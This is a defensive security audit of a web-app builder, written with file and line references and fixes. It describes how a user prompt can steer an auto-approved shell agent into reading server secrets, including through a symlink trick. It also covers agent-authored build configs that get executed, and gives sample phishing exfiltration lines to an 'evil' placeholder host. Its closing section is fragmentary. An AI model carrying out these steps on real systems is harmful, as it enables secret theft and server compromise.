# Kodely security audit — August 2026

Read-only review of `app/`, `lib/`, `proxy.ts`, `prisma/schema.prisma`, and `scripts/`.
No application code was modified. Nothing was tested against kodely.me or any remote host;
every finding below is derived from reading the code in this checkout.

Secrets are referred to by environment-variable **name** only. No credential value appears
in this document.

## Critical

### C1 — The SDK build engine gives a user prompt unrestricted shell on the app server

**`lib/agent-sdk.ts:281-288`**

```ts
for await (const message of query({
  prompt: `${historyText}## Current request\n${opts.request}${imageNote}`,
  options: {
    cwd: workDir,
    systemPrompt: adaptPromptForSdk(systemPrompt),
    allowedTools: ["Read", "Write", "Edit", "Bash", "Glob", "Grep"],
    permissionMode: "acceptEdits",
  },
}))
```

`allowedTools` is **not** a restriction list. The SDK's own type documentation
(`node_modules/@anthropic-ai/claude-agent-sdk/sdk.d.ts:1416-1422`) states:

> "List of tool names that are auto-allowed without prompting for permission. These tools
> will execute automatically without asking the user for approval. To restrict which tools
> are available, use the `tools` option instead."

So listing `"Bash"` there **auto-approves every shell command the model emits**, with no
`canUseTool` callback, no `disallowedTools`, and no hooks anywhere in this file.

**Exploitation path.** `opts.request` is the user's build prompt, taken verbatim from the
request body at `app/api/generate/route.ts:30` and passed through `lib/agent.ts:222-223`.
Any authenticated user — a free signup with the 750-credit grant is enough — submits a
prompt that instructs the agent to run shell commands. The system prompt tells the agent to
build websites, but that is guidance, not a boundary; it is inside the same context window
as the attacker's text.

`cwd: workDir` is **not** a jail. It sets the initial directory; it does not confine
`Bash`. From there the process user can:

- read `/opt/kodely/.env` — `DATABASE_URL`, `STRIPE_SECRET_KEY`, `STRIPE_WEBHOOK_SECRET`,
  `ANTHROPIC_API_KEY`, `KODELY_REWARDS_ID_SALT`, `GOOGLE_CLIENT_SECRET`,
  `KODELY_DISCORD_CLIENT_SECRET`, `CLAUDE_CODE_OAUTH_TOKEN`;
- read `~/.claude/.credentials.json` (the subscription token this engine authenticates with —
  `lib/agent-sdk.ts:117-119` confirms the path);
- connect to Postgres directly with the recovered `DATABASE_URL` — every user record,
  session `tokenHash`, and the credit ledger;
- write to `/opt/kodely`, which the deploy user owns (`deploy.sh:83-92` does
  `git reset --hard` and `npm run build` in place as that user) — a persistent backdoor in
  the application itself;
- poison `KODELY_FOUNDATION_DIR` (`lib/build-site.ts:12`, default
  `/home/kodely/kodely-foundation`), whose `node_modules` is symlinked into **every other
  user's build** at `lib/build-site.ts:41-45` — a cross-tenant supply-chain compromise;
- attempt `sudo systemctl …`, which `deploy.sh:92` shows the service account is configured
  to run.

**Is it active?** Yes in this checkout. `.env` sets `KODELY_ENGINE=sdk`, and `lib/agent.ts:215`
routes to this engine on exactly that value. That `.env` describes itself as a local dev copy,
so I **cannot confirm the production VM's value from here** — see "Not assessed".

**Secondary path in the same file.** `readFileTree` (`lib/agent-sdk.ts:222-234`) calls
`readFile(full, "utf8")` on any entry that is not a directory. A symlink is not a directory,
so `readFile` **follows it**. An agent that runs `ln -s /opt/kodely/.env ./notes.txt` gets the
target's contents slurped into a `ProjectFile` row and rendered back in the editor — secret
exfiltration with no outbound network call at all. `safeRelPath` (`:206-212`) validates the
*name*, never the link target.

**Fix.** Do not put `Bash` in `allowedTools`. Use the `tools` option to restrict the toolset
to `Read`/`Write`/`Edit`/`Glob`/`Grep`, add a `canUseTool` callback that denies anything
else, and run the whole engine inside a container or VM with a read-only root, a dedicated
unprivileged user, no egress, and no access to the app's `.env` or the foundation directory.
Use `lstat`/`Dirent.isSymbolicLink()` in `readFileTree` and skip symlinks.

### C2 — `vite build` executes an agent-authored config file with the full process environment

**`lib/build-site.ts:52-56` and `:64-70`**

```ts
await runBounded(
  process.execPath,
  [join("node_modules", "vite", "bin", "vite.js"), "build"],
  workDir,
);
```
```ts
const child = spawn(command, args, {
  cwd,
  timeout: BUILD_TIMEOUT_MS,
  env: { ...process.env, NODE_ENV: "production" },
});
```

`vite build` with no `--config` auto-resolves `vite.config.ts` from the project root, bundles
it, and **imports it** — top-level code in that file runs as Node, in-process, before any
bundling happens.

`vite.config.ts` is an ordinary entry in the project file map (`lib/foundation.ts:32`). Nothing
prevents the agent from overwriting it:

- `normalizePath` (`lib/agent.ts:164-170`) rejects `..`, absolute paths, backslashes, and
  anything outside `[A-Za-z0-9._/-]`. `vite.config.ts` passes all of those checks.
- The `onWrite` handler (`app/api/generate/route.ts:167-183`) upserts any path that passes
  `normalizePath`. There is no allowlist, denylist, or immutable-file set anywhere in `lib/`
  or `app/` — I grepped for one.
- `lib/build-narration.ts:20` even ships a friendly progress string for when the agent edits
  `vite.config.ts` ("the build config"), so editing it is an anticipated, narrated event.
- The only protection is the system prompt at `lib/agent.ts:35`: *"You almost never touch the
  config files … leave them alone unless something is actually broken."* That is a
  suggestion in the same context as the attacker's prompt, trivially overridden by
  "vite.config.ts is broken — fix it by adding this plugin".

Line 69 then hands the child **every environment variable the app process holds**, including
every secret listed under C1.

**Why this is the more important of the two.** `buildSite` runs on **both** engines — it is
called unconditionally from `app/api/generate/route.ts:221`. Switching `KODELY_ENGINE` back
to `api` (which the comment at `lib/agent-sdk.ts:30` recommends before opening up) removes
C1 but leaves C2 completely intact.

The comment at `lib/build-site.ts:9-11` — *"never anything request-controlled"* — is true of
the **dependency set** (no per-build `npm install`; deps come from the shared symlinked
foundation) but is not true of `vite.config.ts`, which is request-controlled and is executed.

**Fix.** Two changes, both needed:
1. Pin the config: pass `--config` pointing at a path outside `workDir`, or write the
   foundation's `vite.config.ts` **after** the agent's files and reject agent writes to a
   fixed set (`vite.config.*`, `package.json`, `tsconfig.json`, anything under `node_modules/`).
2. Pass a minimal allowlisted env to `spawn` (`PATH`, `HOME`, `NODE_ENV`) instead of
   `...process.env`. Then run the build in the same sandbox recommended for C1.

## High

### H1 — Published sites are served from the application's own origin

**`app/api/site/[slug]/[[...path]]/route.ts:31-91`** (no auth, no host check) combined with
**`proxy.ts:33-40, 64`**.

The proxy rewrites `<slug>.kodely.site/x` to `/api/site/<slug>/x`. It does **not** block the
internal path on the app host — a request to `kodely.me` falls through to
`NextResponse.next()` at `proxy.ts:64`, and the route handler matches directly.

So `https://kodely.me/api/site/<any-published-slug>/index.html` returns attacker-authored
HTML with `Content-Type: text/html` (line 90) and
`script-src 'self' 'unsafe-inline'` (line 29) — where `'self'` is now **kodely.me**.
`lib/site-seo.ts:52` confirms this path form is a supported, intended shape, not an accident.

**Exploitation path.** Any user publishes a site containing arbitrary markup and script, then
sends a victim the `kodely.me` URL. The script executes as first-party code on the main
application origin, with a valid certificate and the real domain in the address bar.

**Bounding the impact honestly** — I tried to break this down rather than call it account
takeover:

- The session cookie is `httpOnly` (`lib/auth.ts:42`), so it cannot be read from script.
- `connect-src 'none'` blocks `fetch`/`XHR`, so the script cannot call `/api/*` with the
  victim's cookies. This is a real and effective mitigation.
- Form posts are **not** blocked (no `form-action` — see M4), but most API routes parse
  `req.json()` and reject urlencoded bodies. `POST /api/auth/logout` takes no body, so
  forced logout works; that is nuisance-grade.
- What is **not** mitigated is the phishing surface: the script can repaint the page as a
  Kodely login form at a genuine `https://kodely.me/...` URL and `POST` the credentials to
  an external host via `<form action="https://evil…">`, or exfiltrate via
  `location = 'https://evil…?d=' + data`. Neither is stoppable by the current CSP.

That makes this credential theft at a trusted origin rather than direct session theft —
high, not critical.

**Verified not vulnerable:** the sibling preview route is scoped correctly.
`app/api/preview/[id]/[[...path]]/route.ts:29` does
`findFirst({ where: { id, userId: user.id } })`, so a link to another user's draft returns
404 for the victim. Only the *owner* can render their own draft on the app origin, which is
self-XSS and not a cross-user path.

**Fix.** Serve site content only on the sites domain: in the site route, return 404 unless
the `Host` ends with `KODELY_SITES_BASE`; keep the `/api/site/<slug>` path form for staging
behind an explicit staging-host check. Long-term, move both site and preview serving to a
separate registrable domain so `'self'` can never mean the app origin.

### H2 — No rate limiting on authentication

**`app/api/auth/login/route.ts:6-27`** and **`app/api/auth/signup/route.ts:11-41`**

`lib/rate-limit.ts` exports exactly three limiters — `checkGenerateRateLimit` (line 15),
`checkPublishRateLimit` (line 26), `checkEnhanceRateLimit` (line 55) — and **all three key on
`userId`**, so none of them can apply pre-authentication. Neither auth route imports any of
them. There is no lockout counter, no CAPTCHA, no per-IP throttle, and no failed-attempt
record in the schema.

Consequences:

- **Login** (`:16-24`): unbounded online password guessing / credential stuffing against a
  known email. `verifyPassword` uses scrypt at Node's defaults, which is a cost ceiling on
  throughput but is not a rate limit.
- **Signup** (`:31-37`): no email verification anywhere in the codebase, and
  `grantCredits(user.id, SIGNUP_GRANT, "signup_grant")` immediately issues 750 credits —
  roughly $1.50 of real model spend at `MICROS_PER_CREDIT` (`lib/credits.ts:12,20`). A script
  can mint accounts and credits in a loop. The rewards feature defends its 200 credits
  carefully (`MIN_ACCOUNT_AGE_HOURS`, identity HMAC, a global velocity breaker at
  `app/api/rewards/_lib.ts:155-188`); the 750-credit signup grant, which is nearly 4x larger,
  has none of it.

**Fix.** Durable, DB-backed, per-IP **and** per-email throttling on login with exponential
backoff; per-IP throttling plus email verification before the signup grant lands (or defer
the grant until verification). Note that in-memory throttling of the kind used at
`app/api/contact/route.ts:13` would not be sufficient here — it resets on deploy and does not
span processes.

## Medium

### M1 — Credit-ledger read-then-write race

**`lib/credits.ts:63-94`**

```ts
export async function grantCredits(userId, amount, reason) {
  const balance = await getBalance(userId);        // read
  return db.creditLedger.create({ … balanceAfter: balance + amount });   // write
}
```

`getBalance` reads `balanceAfter` off the newest row and the insert happens in a separate
statement, with no transaction, no lock, and no unique constraint to collide on. Two
concurrent operations both read balance `B` and both write a row derived from `B`; the later
row's `balanceAfter` clobbers the earlier one's accounting. `chargeForBuild` (`:82-94`) has
the identical shape, so two builds finishing together can result in the user being charged
once. `createdAt` ties at millisecond precision make ordering non-deterministic too.

This is **already known to the codebase** — `app/api/rewards/_lib.ts:322-326` names it
precisely and scopes the advisory-lock fix to rewards only:

> "*(A build charge committing between this transaction's read and its insert would still be
> clobbered — that race is inherent to the ledger's read-then-write shape and predates this
> feature …)*"

Not rated higher because the win is bounded (credits, not money) and exploiting it reliably
needs tight request timing. The admin users page already surfaces the symptom as "Ledger
drift" (`app/admin/users/page.tsx:223`), which is a good detection control.

**Fix.** Apply the same `pg_advisory_xact_lock` pattern from `app/api/rewards/_lib.ts:272-274`
to `grantCredits` and `chargeForBuild`, or derive balance with `SUM(delta)` under a
`SELECT … FOR UPDATE` on the user row.

### M2 — `insert-seo-batch*.mjs` bypasses HTML validation into a raw-render sink

**`scripts/insert-seo-batch1.mjs:8-25`** (and the three near-identical siblings) upsert
`bodyHtml` into `BlogPost` with no validation. That column is rendered unescaped at
**`app/blog/[slug]/page.tsx:118`**:

```tsx
<div className="article-body mt-10" dangerouslySetInnerHTML={{ __html: post.bodyHtml }} />
```

The maintained pipeline does this correctly: `scripts/seo/seed.mjs:51-60` refuses to write
unless `validateAll` passes, and `scripts/seo/validate.mjs:31-48,64-73` enforces a tag
allowlist and rejects `src=`, `style=`, `on*=` handlers, and absolute URLs. The four
`insert-seo-batch*` scripts skip all of it. They also read their JSON input relative to the
**current working directory** rather than the repo root (contrast `scripts/seo/lib.mjs:14-15`),
so which file gets ingested depends on where the operator is standing.

**Verified safe today:** there is no application write path to `BlogPost` — the only
references in `app/` and `lib/` are the three reads at `app/blog/page.tsx:12` and
`app/blog/[slug]/page.tsx:19,46`. Exploitation requires shell access, which is why this is
medium and not high. But an XSS here lands on the app origin, so it stacks with H1.

**Fix.** Delete the four superseded `insert-seo-batch*.mjs` scripts, or route them through
`validateAll`. Sanitize `bodyHtml` at render time regardless.

### M3 — Contact-form throttle keys on a spoofable header

**`app/api/contact/route.ts:30-35`**

```ts
const fwd = req.headers.get("x-forwarded-for");
return fwd?.split(",")[0]?.trim() || req.headers.get("cf-connecting-ip") || "unknown";
```

Cloudflare **appends** the connecting IP to an existing `X-Forwarded-For` rather than
replacing it, so the first entry is whatever the client sent. An attacker rotating a
synthetic `X-Forwarded-For` gets a fresh bucket on every request, defeating
`MAX_PER_IP_PER_HOUR = 5` entirely — on the one unauthenticated endpoint that makes the
server send mail. The trustworthy header, `cf-connecting-ip`, is only used as a fallback.

The throttle is also in-memory (`:13`), so it is per-process and resets on deploy — the file
says so at `:9-12` and correctly calls it a speed bump.

**Fix.** Prefer `cf-connecting-ip`, then the **last** `X-Forwarded-For` entry, and never the
first. Move the counter to the database if it needs to be real.

### M4 — `SANDBOX_CSP` omits `form-action` and `base-uri`

**`app/api/site/[slug]/[[...path]]/route.ts:28-29`** and the identical copy at
**`app/api/preview/[id]/[[...path]]/route.ts:16-17`**

```
default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline';
img-src 'self' data:; connect-src 'none'; frame-ancestors 'self'
```

`form-action` and `base-uri` do **not** fall back to `default-src`. A generated page can
therefore `POST` to any external host via a form, and can retarget every relative URL on the
page with an injected `<base href="https://evil…">`. `connect-src 'none'` is doing good work
against `fetch`, but it does not close the form channel — this is what makes the phishing
scenario in H1 workable.

Also note `frame-ancestors 'self'` resolves against the **serving** origin. On
`<slug>.kodely.site` that means only that same subdomain may frame it — correct. It does not
let kodely.me frame it, which is fine because the editor uses a sandboxed iframe on a
same-origin path instead.

**Fix.** Add `form-action 'self'; base-uri 'none'; object-src 'none'`. Since these sites are
static by contract, consider dropping `'unsafe-inline'` from `script-src` too.

### M5 — No application-wide security headers

**`next.config.ts:3-5`** is empty. There is no `headers()` block, and the only
`Content-Security-Policy` in the tree is the sandbox CSP on the two site-serving routes. So
the dashboard, settings, editor, admin panel, and marketing pages ship with no CSP, no
`Strict-Transport-Security`, no `X-Content-Type-Options: nosniff`, and no `Referrer-Policy`.

**Deliberately not rated higher, because clickjacking is largely already defused.** The
session cookie is `sameSite: "lax"` (`lib/auth.ts:43`), and Lax cookies are not sent on
cross-site subresource requests — a hostile page framing `kodely.me` gets a logged-out
render, so there is nothing to hijack. What remains is the absence of HSTS (relevant given
`lib/site-seo.ts:36-46` documents that Cloudflare talks to the origin over plain HTTP) and
missing `nosniff`/`Referrer-Policy` hardening.

**Fix.** Add a `headers()` block in `next.config.ts` setting `Strict-Transport-Security`,
`X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, and a
`frame-ancestors 'none'` CSP for app routes.

## Low

**L1 — Stripe webhook can drop a paid grant.** `app/api/billing/webhook/route.ts:36-56` claims
the event row *before* granting. The comment at `:32-35` correctly explains why that ordering
beats the alternative, but it has a failure mode of its own: if `grantCredits` (`:55`) throws
after the claim commits, the Stripe retry hits P2002 and returns `{ deduped: true }` — the
customer paid and never receives credits, silently. Fix: do the claim and the grant in one
transaction, or record a reconciliation event on grant failure.

**L2 — Predictable slugs.** `app/api/projects/route.ts:14` and `app/api/projects/[id]/route.ts:22`
use `Math.random().toString(36).slice(2, 7)` for the slug suffix. `Math.random` is not a CSPRNG.
Slugs are public addresses so the confidentiality impact is nil, but slugs are globally unique
and permanent (`app/api/projects/[id]/route.ts:52-69` explains why they never move), so
predictability enables squatting a slug a victim is about to be assigned. Use
`randomBytes`/`randomUUID`.

**L3 — `Host` header trusted in several places.** `lib/site-seo.ts:31-52` (canonical/og:url,
escaped at `:127,151` so not an injection), `app/api/auth/google/start/route.ts:16-24` and
`callback/route.ts:18-24` (redirect origin), `app/api/rewards/_lib.ts:473-477`, and
`app/api/projects/[id]/publish/route.ts:132-135`. The OAuth cases are largely self-limiting —
Google and Discord reject a `redirect_uri` that is not pre-registered — and prod sits behind
Cloudflare with a fixed `server_name`, so I could not construct a concrete exploitation path
from here. Flagged as a systemic pattern to pin to an `APP_URL` allowlist rather than as an
exploitable bug.

**L4 — Session lifecycle gaps.** `createSession` (`lib/auth.ts:35-48`) does not invalidate the
user's existing sessions, and there is no "sign out everywhere". `destroySession` (`:50-55`)
correctly kills only the current token. There is also **no password-change or password-reset
route anywhere in `app/api/`** — so a user who suspects compromise has no self-serve remedy,
and a stolen 30-day session token stays valid for its full life. *Session fixation itself is
not exploitable:* login always mints a fresh random token and overwrites the cookie.

**L5 — `promote-admin.mjs` has no guardrails.** `scripts/promote-admin.mjs:11-31` takes an email
from `argv[2]`, does an exact `findUnique`, and sets `role: "ADMIN"` with no confirmation
prompt, no `--yes` flag, no printed target database, and no `Event` audit record — unlike
`scripts/retention.mjs`, which requires `--apply` and prints the target with the password
stripped. The selection logic itself is sound (exact match, no bulk path, typo is a safe
no-op). It also prints every admin's email to stdout on every run (`:42`).

**L6 — Project creation is unmetered.** `app/api/projects/route.ts:29-55` has no rate limit;
each call seeds the full foundation file set. Storage-exhaustion nuisance.

**L7 — `secret-scan.ts` is a narrow denylist.** `lib/secret-scan.ts:14-25` covers AWS keys,
`sk-`/`sk_` keys, Google API keys, PEM headers, JWTs, and generic `key = "…"` assignments. It
does **not** match Postgres connection strings, `ghp_`/`github_pat_`, Slack `xox*`, or the
`CLAUDE_CODE_OAUTH_TOKEN` shape. Correctly redacts to the first 6 characters (`:5-7`) so it
never echoes a secret into an HTTP response — though for a value of ≤6 characters it returns
the whole thing, which the ≥20-character patterns make unreachable in practice. Treat it as a
speed bump, not a control.

**L8 — Single-build overspend.** `app/api/generate/route.ts:46-53` gates on `balance <= 0`, so a
user with 1 credit can start a build measured at 400+ (`lib/credits.ts:124`) and land negative.
The spend cap (`:59-72`) is likewise checked before the build, never during. Business risk
rather than a vulnerability; consistent with the documented anti-bill-shock design.

**L9 — Raw Prisma errors logged.** `lib/events.ts:70-73` logs the whole error object; Prisma
errors can echo the offending `data` payload. Bounded today by the props discipline documented
at `lib/events.ts:13-14`, but it is where a props regression would surface in log storage.

**L10 — `scripts/eval/results/` is not gitignored** and already contains a results file;
`--save-sources` (`scripts/eval/run.mjs:262`) embeds full generated source. Fixture-derived
today, so housekeeping rather than a leak.

**L11 — `deploy.sh:19-20` commits the production root IP and internal VM address.** Committed
infrastructure disclosure; low value to an attacker on its own.

## What is correctly done

This codebase is unusually security-conscious, and most of the obvious classes are closed.
Specifically verified:

- **Authorization is genuinely consistent.** Every mutating and reading route under
  `app/api/projects/**` scopes by `userId` in the *same* query as the id — `GET :35`,
  `PATCH :96` (`updateMany`, with the reasoning written out at `:92-95`), `POST :130`,
  `DELETE :228`, plus `builds/route.ts:15`, `export/route.ts:22`, `publish/route.ts:29`, and
  `generate/route.ts:40`. **I found no IDOR.** The two routes that take a *second* id are the
  ones most likely to slip and both are correct:
  `builds/[buildId]/restore/route.ts:32-34` filters on
  `{ id: buildId, projectId: id, status: "SUCCEEDED", project: { userId: user.id } }`, and
  `feedback/route.ts:43-46` filters on `{ id: buildId, project: { userId: user.id } }`.
- **Admin gating is layered properly.** `app/admin/layout.tsx:6` redirects non-admins, and
  each page independently calls `getAdminUser()` and `notFound()` — `admin/page.tsx:27`,
  `admin/users/page.tsx:103`, `admin/users/[id]/page.tsx:41` — so a layout is never the sole
  boundary. `proxy.ts:42-61` adds host-based obscurity and is explicit at `:9-16` that it is
  obscurity, not authorization.
- **No SQL injection.** There is no `$queryRawUnsafe` / `$executeRawUnsafe` anywhere in the
  tree. The raw queries in `app/admin/users/page.tsx:154-176` use `Prisma.join(ids)` inside a
  tagged template, which emits bound parameters; the admin search term `q` never reaches raw
  SQL at all, only Prisma's parameterized `contains` (`:114-122`). The advisory locks at
  `app/api/rewards/_lib.ts:273-274,337-338` and the raw queries in `lib/retention.ts:174,286,301`
  are likewise parameterized with constant inputs.
- **Billing integrity is sound.** Signature verified before anything else
  (`webhook/route.ts:22-30`); the idempotency row is claimed *before* the grant (`:36-42`);
  credit amounts are re-derived server-side from the fixed `CREDIT_PACKS` table rather than
  trusted from webhook metadata (`:49-55`, `lib/stripe.ts:24-32`); the checkout route lets the
  client choose only a pack id (`checkout/route.ts:18-22`). This is the correct design.
- **Path traversal is closed on every path I checked.** `normalizePath` (`lib/agent.ts:164-170`)
  and `safeRelPath` (`lib/agent-sdk.ts:206-212`) both reject `..`, absolute paths, backslashes,
  and non-allowlisted characters. The `[[...path]]` catch-alls in the site and preview routes
  do exact **string equality against a DB column** (`site/…:75-77`, `preview/…:33-35`) — there
  is no filesystem lookup to traverse. `lib/zip.ts:61-67` strips rather than rejects traversal
  segments.
- **The editor preview iframe is sandboxed correctly.** `app/projects/[id]/Editor.tsx:476` uses
  `sandbox="allow-scripts allow-forms"` **without** `allow-same-origin`, so preview content runs
  in an opaque origin and cannot touch the parent app even though it is served from a
  same-origin path. This is the right call and it is easy to get wrong.
- **Passwords and session tokens.** scrypt with a 16-byte random salt and `timingSafeEqual`
  (`lib/auth.ts:15-28`); 32 bytes of `randomBytes` for the token, stored only as a SHA-256 hash
  so a DB read yields no usable cookie (`:30-38`); `httpOnly`, `sameSite: "lax"`, `secure` in
  production, and no `domain` — the host-only property that `proxy.ts:51-57` explicitly relies
  on. Login responses are shape-identical whether or not the account exists
  (`login/route.ts:17-24`).
- **OAuth CSRF is handled on both flows.** Random state in an HttpOnly cookie, compared server
  side (`google/start:34,51`, `google/callback:42`). The Discord flow goes further and pins the
  Kodely user id into the state, re-checked at `discord/callback:81`, with a constant-time
  compare at `:47-52` — that is what stops a captured callback being replayed into another
  session. Google account linking requires `email_verified` (`google/callback:67`), which
  correctly blocks takeover of an existing password account via an unverified Google email.
- **The rewards system is the best-defended part of the codebase.** Secret-keyed HMAC identity
  hashes so ledger read access cannot enumerate customers (`_lib.ts:71-87,138-145`), one grant
  per *external* identity across all accounts, a 24-hour account-age gate, a global velocity
  circuit breaker, and correct `pg_advisory_xact_lock` serialization with a fixed lock ordering
  to avoid deadlock (`:246-311`). It fails closed when unkeyed and when Discord's answer is
  inconclusive (`discord/callback:133-140`).
- **SMTP header injection is closed.** `lib/mail.ts:50-52` strips CR/LF and length-caps before
  any user value reaches `replyTo` or `subject`.
- **The enhance path is a good example of the opposite of C1.** `lib/enhance.ts:143-157` runs the
  SDK with `allowedTools: []`, `settingSources: []`, `cwd: tmpdir()`, `maxTurns: 1` — the user
  prompt is data and the agent has no tool to act with. This is the pattern `lib/agent-sdk.ts`
  should follow.
- **No secrets in the client bundle.** The only `NEXT_PUBLIC_*` reference in the entire tree is
  `NEXT_PUBLIC_SITES_BASE` (`app/projects/[id]/Editor.tsx:24`), a public hostname. No hardcoded
  credential appears in any source file; `.env*` is gitignored and untracked. `lib/db.ts` does
  not enable Prisma query logging. No secret is written to any log or response.
- **CSRF is adequately covered without tokens**, because `sameSite: "lax"` blocks cross-site
  form posts and every mutating route is POST/PATCH/PUT/DELETE parsing `req.json()`. I found no
  state-changing `GET`.
- **Retention reasoning is sound.** `SESSION_GRACE_DAYS = 0` (`lib/retention.ts:36`) purges
  expired sessions immediately; `STRIPE_EVENT_RETENTION_DAYS = 365` (`:100`) gives a ~100x
  margin over Stripe's ~3-day automatic retry window, with the residual manual-resend risk
  documented rather than hidden; `CreditLedger` is correctly exempt from pruning (`:425-459`).

  describes itself as a local dev copy pointing at a local Postgres. It sets
  `KODELY_ENGINE=sdk`, but **I cannot confirm what the production VM sets.** If prod runs

  `KODELY_ENGINE` on `/opt/kodely` is the single highest-value next step.*
- **Host and edge configuration.** nginx server blocks, Cloudflare WAF/rate-limiting rules,

  — none are in this repo. This matters for H1 (whether `/api/site/…` is reachable on
  kodely.me through the edge), H2 (whether Cloudflare already throttles login), M3, and L3.
- **VM privileges.** Whether the `kodely` service account has passwordless sudo beyond
  `systemctl`, the filesystem permissions on `/opt/kodely/.env` and

- **Database privileges.** Whether the app's Postgres role is superuser or scoped, which bounds
  what a recovered `DATABASE_URL` grants.
- **Runtime behaviour.** No finding here was confirmed by execution — per the brief, nothing
  was run against kodely.me or any remote host, and no exploit was executed locally. C1 and C2

- **Deployed vs. committed code.** `git status` shows ~30 modified files in the working tree.
